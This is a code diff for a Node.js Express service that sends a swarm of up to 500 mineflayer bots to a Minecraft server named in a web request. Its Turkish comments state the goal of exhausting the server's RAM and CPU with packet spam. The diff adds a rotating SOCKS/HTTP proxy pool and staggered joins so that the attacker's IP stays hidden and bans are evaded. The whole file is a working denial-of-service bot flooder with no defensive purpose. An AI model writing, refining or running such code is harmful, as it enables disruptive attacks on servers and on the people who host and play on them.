@@ -1,8 +1,17 @@
 const mineflayer = require('mineflayer');
+const { ProxyAgent } = require('proxy-agent');
 const express = require('express');
 const app = express();
 app.use(express.json());
 app.use(require('cors')());
+
+// 🛡️ VIP PROXY HAVUZU (Burayı çalışan güncel proxylerle doldur kanka)
+const proxyList = [
+    "socks5://ip:port", 
+    "socks4://ip:port",
+    "http://ip:port"
+    // Ne kadar çok proxy, o kadar gizli kimlik!
+];
 
 let activeBots = [];
 
@@ -11,55 +20,59 @@ app.post('/deploy', (req, res) => {
     const host = ip.includes(':') ? ip.split(':')[0] : ip;
     const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;
 
-    console.log(`[⚡ VIP POWER] 129GB RAM Modu Aktif. Hedef: ${host}:${port}`);
+    console.log(`[STEALTH MODE] Hedef: ${host}:${port} | 129GB RAM Ayrıldı.`);
 
-    // Bot sayısını makine gücüne göre artırabilirsin (Örn: 100)
-    for (let i = 0; i < Math.min(count, 100); i++) {
+    for (let i = 0; i < Math.min(count, 500); i++) {
+        // ⏱️ HER 2 SANİYEDE BİR GİRİŞ (i * 2000ms)
         setTimeout(() => {
+            const currentProxy = proxyList[i % proxyList.length];
+            
+            // Eğer proxy listesi boşsa hata vermemesi için kontrol
+            if (!currentProxy) {
+                console.log("!!! PROXY LISTESI BOS, IP ACIGA CIKABILIR !!!");
+                return;
+            }
+
+            const agent = new ProxyAgent(currentProxy);
+
             const bot = mineflayer.createBot({
                 host: host,
                 port: port,
-                username: `Z_Client_${Math.floor(Math.random() * 999999)}`,
-                version: "1.20.1",
+                username: `Trgr_Vip_${Math.floor(Math.random() * 89999) + 10000}`,
+                version: false,
+                agent: agent, // IP KALKANI AKTİF
                 hideErrors: true,
-                viewDistance: "tiny" // Botun RAM yemesini engeller, sunucuya yüklenir
+                connectTimeout: 60000
+            });
+
+            bot.on('login', () => {
+                console.log(`[SECURE] ${bot.username} sızdı. (IP: ${currentProxy})`);
             });
 
             bot.on('spawn', () => {
-                console.log(`[+] ${bot.username} Sızdı. Paket yağmuru başladı!`);
-                
-                // SUNUCU RAM VE CPU BİTİRME DÖNGÜSÜ (Ultra Fast)
+                // Sunucuyu yormak için hafif ama sürekli paket gönderimi
                 setInterval(() => {
-                    if (bot.entity) {
-                        // 1. Chunk Yükleme Paketi (Sunucuyu yorar)
-                        bot.look(Math.random() * 360, Math.random() * 180);
-                        
-                        // 2. Etkileşim Spam (Sunucu her hareketi hesaplamak zorunda kalır)
+                    if(bot.entity) {
+                        bot.look(Math.random() * 360, 0);
                         bot.swingArm('right');
-                        bot.setControlState('sneak', true);
-                        
-                        // 3. Hareket Paketi (Sunucuda lag yapar)
-                        bot.setControlState('jump', true);
-                        
-                        setTimeout(() => {
-                            bot.setControlState('sneak', false);
-                            bot.setControlState('jump', false);
-                        }, 50);
                     }
-                }, 40); // Saniyede 25 paket gönderir (Extreme)
+                }, 100);
             });
 
-            bot.on('error', (err) => console.log(`[!] ${err.message}`));
+            bot.on('error', (err) => {
+                console.log(`[!] Hata (Proxy kaynaklı olabilir): ${err.message}`);
+            });
+
             activeBots.push(bot);
-        }, i * 200); // Çok hızlı giriş (0.2 saniye arayla)
+        }, i * 2000); // 👈 İSTEDİĞİN 2 SANİYE GECİKME BURADA
     }
-    res.json({ success: true, message: "129GB RAM Gücüyle Ordu Sevk Edildi!" });
+    res.json({ success: true, message: "Hayalet Ordu 2 saniye aralıklarla sızmaya başladı!" });
 });
 
 app.post('/stop', (req, res) => {
     activeBots.forEach(b => b.quit());
     activeBots = [];
-    res.json({ success: true });
+    res.json({ success: true, message: "Tüm bağlantılar güvenli şekilde kesildi." });
 });
 
 app.listen(process.env.PORT || 3000);
